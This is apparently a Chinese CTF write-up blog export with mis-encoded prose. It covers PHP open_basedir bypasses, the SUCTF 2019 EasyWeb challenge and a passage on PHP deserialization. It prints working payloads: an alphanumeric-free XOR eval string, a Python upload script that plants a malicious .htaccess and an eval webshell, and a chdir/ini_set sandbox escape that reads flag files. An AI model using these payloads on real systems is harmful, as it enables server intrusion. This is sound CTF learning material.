<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$a</span>  = Directorylterator(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;__toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getFilename</code><br><img src="https://img-blog.csdnimg.cn/img_convert/683144c066b6704521876efbdbd8e34f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$a</span> = Directorylterator(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;isFile())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;getFilename();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>2.ç»“åˆopendir()+readdir()<br>ï¼ˆåªèƒ½è®¿é—®æ ¹ç›®å½•ä»¥åŠopen_basediré™åˆ¶çš„ç›®å½•ï¼‰<br><img src="https://img-blog.csdnimg.cn/img_convert/2fcf089720ffd69994eeabfb93735811.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/img_convert/2a3da8a64ed12c19bd236af651de0872.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$a</span> = opendir(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$file</span>=readdir(<span class="variable">$a</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x04:chdir()+ini_set()ç»“åˆ</strong><br>1.é¦–å…ˆè¦æ³¨æ„phpæ–‡ä»¶ä¸èƒ½åœ¨æ ¹ç›®å½•ä»¥åŠopen_basediræ‰€è§„å®šçš„ç›®å½•ä¸‹ï¼Œéœ€è¦æ–°å»ºä¸€ä¸ªæ–‡ä»¶<br>2.è¦è®¾ç½®ä¸€ä¸ªå¯ä»¥è¿›è¡Œè·³è½¬çš„open_basedir<br>3.chdiråº”è¯¥æ˜¯ç”¨æ¥è¿›è¡Œè·³è½¬ç›®å½•çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€å®šæ˜¯å››ä¸ª<br>ï¼ˆå…ˆè®°payloadå§ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mkdir(<span class="string">&#x27;yuer&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;yuer&#x27;</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> ini_get(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><ul>
<li>æ— å­—æ¯æ•°å­—çš„webshell</li>
<li>åˆ©ç”¨python requestsä¸Šä¼ æ–‡ä»¶</li>
<li>.htaccess</li>
<li>bypass open_basedir</li>
</ul>
<p><a href="https://xz.aliyun.com/t/4720">bypass open_basedirçš„æ–°æ–¹æ³•</a><br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2">ä»PHPåº•å±‚çœ‹open_basedir bypass</a><br><a href="https://blog.csdn.net/qq_42967398/article/details/105615235">BUU WEB [SUCTF 2019]EasyWeb</a><br>ç®€å•ä¾‹å­ï¼š<br><a href="https://blog.csdn.net/qq_39531149/article/details/93238607">python requestsæ–‡ä»¶ä¸Šä¼ </a></p>
<hr>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å®¡è®¡ï¼š</strong></p>
<ul>
<li>1.æ— å­—æ¯æ•°å­—çš„webshell</li>
</ul>
<p>ç›´æ¥banäº†å­—æ¯å’Œæ•°å­—ï¼Œè¿˜æœ‰å–åç¬¦å·ï¼Œè¿˜æœ‰<code>_</code>ï¼Œè¿™æ ·åªèƒ½åˆ©ç”¨å¼‚æˆ–<code>^</code>ç¬¦å·è¿›è¡Œè¿ç®—äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>2.æ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶</li>
</ul>
<p>æ–‡ä»¶æ‹“å±•åä¸èƒ½å‡ºç°<code>ph</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶å†…å®¹é‡Œé¢ä¸èƒ½å‡ºç°æ ‡ç­¾<code>&lt;?</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶å¤´è¿›è¡Œé™åˆ¶<br><img src="https://img-blog.csdnimg.cn/20210712142143701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<blockquote>
<p>å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› FALSEã€‚è¿”å›å€¼å’Œ getimagesize() è¿”å›çš„æ•°ç»„ä¸­çš„ç´¢å¼• 2 çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œä½†æœ¬å‡½æ•°å¿«å¾—å¤šã€‚ </p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br></pre></td></tr></table></figure>

<ul>
<li>3.å‡½æ•°é™åˆ¶</li>
</ul>
<blockquote>
<p>count_chars($hhh, 3);<br>3 - è¿”å›ç”±æ‰€æœ‰ä½¿ç”¨äº†çš„å­—èŠ‚å€¼ç»„æˆçš„å­—ç¬¦ä¸²ã€‚ </p>
</blockquote>
<p><strong>è§£é¢˜ï¼š</strong><br>step1ï¼š<br>å…ˆè§£å†³å¼‚æˆ–å§ï¼Œä¹‹å‰ç”¨cå†™è¿‡ï¼Œè¿™æ¬¡ç”¨phpå†™ä¸€ä¸‹ï¼ˆæ³¨æ„æœ‰å¾ˆå¤šå¯è§å­—ç¬¦éƒ½è¢«banäº†ï¼Œå””ï¼Œé‚£è¯•è¯•ç”¨ä¸å¯è§å­—ç¬¦)<br>è¿™é‡Œé€‰æ‹©çš„payloadç”±äºå‡½æ•°<code>exif_imagetype</code>çš„é™åˆ¶ï¼Œå¿…é¡»å­˜åœ¨å››ä¸ªå­—ç¬¦ä¸€æ ·</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">128</span>;<span class="variable">$i</span>&lt;=<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">128</span>;<span class="variable">$j</span>&lt;=<span class="number">255</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$i</span>^<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">if</span>(chr(<span class="variable">$a</span>)==<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                <span class="keyword">echo</span> dechex(<span class="variable">$i</span>).<span class="string">&#x27;^&#x27;</span>.dechex(<span class="variable">$j</span>).<span class="string">&#x27;=&#x27;</span>.chr(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=phpinfo</span></span><br><span class="line"><span class="comment">// $_GET[%fe]</span></span><br></pre></td></tr></table></figure>

<p>step2ï¼š<br>è¢«ç¦äº†å¾ˆå¤šå‡½æ•°ï¼Œå¹¶ä¸”ä»php7å¼€å§‹<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>å°±ä¸å†æ”¯æŒäº†ï¼Œæ‰€ä»¥è¦ä»å‡½æ•°<code>get_the_flag</code>ï¼Œä½†æ˜¯è¿˜ä¸ä¼špythonä¸Šä¼ æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20210712160842655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å­¦ä¹ requestsåº“çš„æ–°ç”¨æ³•ï¼Œä¸»è¦ä»£ç <br><code>res = requests.post(url, data=data, files=files, headers=headers)</code><br>ä½†æ˜¯ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆæ‰æ˜¯æœ€æ ¸å¿ƒçš„ï¼Œå› ä¸ºç›´æ¥ç¦æ­¢äº†<code>ph</code>çš„å‡ºç°ï¼Œæ‰€ä»¥æ²¡åŠæ³•é€šè¿‡åç¼€åç®€å•ç»•è¿‡ï¼Œé‚£ä¹ˆå°±è¦ç”¨åˆ°<code>.user.ini</code>æˆ–è€…<code>.htaccess</code><br>åˆ«äººçš„wpï¼š<br>ï¼ˆä½†æ˜¯ä¸æ˜¯å¾ˆæ‡‚ï¼Ÿè¦å»å­¦ä¹ <code>.user.ini</code>å’Œ<code>.htaccess</code>çš„å…·ä½“ä½œç”¨ï¼‰<br><img src="https://img-blog.csdnimg.cn/20210712193259942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>(æ³¨ï¼šä»£ç ä¸­dataä¸èƒ½çœç•¥ï¼Œè™½ç„¶ä¸€èˆ¬äººåº”è¯¥ä¸ä¼šçœç•¥ï¼›<br>        éš¾ç‚¹åœ¨äº<code>.htaccess</code>çš„æ–‡ä»¶å†…å®¹)<br>æœ€åè¿˜æ˜¯ç…§ç€å¤§ä½¬çš„è„šæœ¬å†™äº†ä¸€ä¸‹ï¼Œå®ç°æ–¹æ³•å…¶å®ç®€å•ï¼Œéš¾çš„è¿˜æ˜¯ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹çš„å„ç§ç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://13d03a1c-3beb-47f6-a48b-baf03f1e046e.node4.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="comment"># 1.shell</span></span><br><span class="line"><span class="comment"># files = &#123;&#x27;file&#x27;: open(&#x27;report.xls&#x27;, &#x27;rb&#x27;)&#125;</span></span><br><span class="line">shell =<span class="string">b&quot;GIF89a12&quot;</span>+base64.b64encode(<span class="string">b&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .ahh</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahh&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/gif&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files)</span><br><span class="line"><span class="built_in">print</span>((r.text))</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.ahh&#x27;</span>,shell,<span class="string">&#x27;image/gif&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼Œç›´æ¥è®¿é—®shellæ–‡ä»¶å¹¶åˆ©ç”¨cmdè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¸è¿‡ç”±äºphpinfoé‡Œé¢ç¦äº†å¾ˆå¤šå‡½æ•°ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç›´æ¥åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°å¾—åˆ°flag</p>
<p>ç„¶åå¯ä»¥å‘ç°<code>open_basedir</code>å¯¹å¯è®¿é—®ç›®å½•è¿›è¡Œé™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä¸Špayload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);</span><br><span class="line">print_r(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>open_basedir</tag>
      </tags>
  </entry>
  <entry>
    <title>phpååºåˆ—åŒ–å†·çŸ¥è¯†å¤ç°</title>
    <url>/2022/01/23/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="å‰ææ¦‚è¦"><a href="#å‰ææ¦‚è¦" class="headerlink" title="å‰ææ¦‚è¦"></a>å‰ææ¦‚è¦</h2><p><a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002</a></p>
<p>ä¹‹å‰æ¯”èµ›é‡åˆ°çš„é¢˜ç›®ï¼Œæ ¹æ®å¸ˆå‚…çš„å›ç­”å¤ç°ä¸€ä¸‹</p>
<h2 id="PHP-Incomplete-Class"><a href="#PHP-Incomplete-Class" class="headerlink" title="__PHP_Incomplete_Class"></a>__PHP_Incomplete_Class</h2><p>å½“ååºåˆ—åŒ– <code>__PHP_Incomplete_Class</code>  è¿™ä¸ªç±»åï¼Œå†å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–æ—¶ï¼Œå…¶å±æ€§ä¼šæ¶ˆå¤±ã€‚</p>
<p><strong>0x01:</strong></p>
<p>é¦–å…ˆ<code>__PHP_Incomplete_Class</code>æ˜¯å½“ååºåˆ—åŒ–ä¸€ä¸ªä¸å­˜åœ¨çš„ç±»æ—¶å‡ºç°çš„ç±»ï¼Œè€Œ<code>__PHP_Incomplete_Class_Name</code>å±æ€§å°±æ˜¯ååºåˆ—åŒ–æ—¶ä¸å­˜åœ¨çš„ç±»çš„ç±»åï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (2) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;   </span></span><br><span class="line"><span class="comment">//  string(1) &quot;A&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(31) &quot;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>è€Œå½“å†æ¬¡ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå†…å®¹å¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œè¿™å°±è¯´æ˜äº†å½“åºåˆ—åŒ–<code>__PHP_Incomplete_Class</code>æ—¶ä¼šå…ˆå»æŸ¥æ‰¾å±æ€§<code>__PHP_Incomplete_Class_Name</code>çš„å€¼ï¼Œç„¶åè¿›è¡Œåºåˆ—åŒ–ä¸ºç›¸å¯¹åº”çš„ç±»</p>
<p>è€Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¯¥ç‰¹ç‚¹æ„é€ ç›¸å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå³æ„é€ å­˜åœ¨<code>__PHP_Incomplete_Class</code>ç±»ä½†ç±»ä¸­å´ä¸å­˜åœ¨<code>__PHP_Incomplete_Class_Name</code>å±æ€§ï¼Œå½“è¯¥å­—ç¬¦ä¸²ç»è¿‡ååºåˆ—åŒ–å’Œåºåˆ—åŒ–ä¹‹åå°±ä¼šä¸¢å¼ƒç±»é‡Œé¢çš„å…¶ä»–å±æ€§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(34) &quot;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="n-3ctf-Ezunser"><a href="#n-3ctf-Ezunser" class="headerlink" title="n^3ctf_Ezunser"></a>n^3ctf_Ezunser</h3><p><a href="https://buuoj.cn/match/matches/68/challenges">é¢˜ç›®</a></p>
<p>ååºåˆ—åŒ–æœªå®šä¹‰çš„ç±»</p>
<p>ç›´æ¥ç»™äº†æºç ï¼š</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>å…ˆå®¡è®¡<code>index.php</code></p>
<p>ç¬¬ä¸€ä¸ªç‚¹åœ¨äº<code>spl_autoload_register</code>ï¼Œå½“è°ƒç”¨<code>index.php</code>ä¸­æ²¡æœ‰å®šä¹‰çš„ç±»çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>myAutoloader($classname)</code>ï¼Œå…¶ä¸­<code>$classname</code>å°±æ˜¯æˆ‘ä»¬æƒ³å®ä¾‹åŒ–çš„ç±»</p>
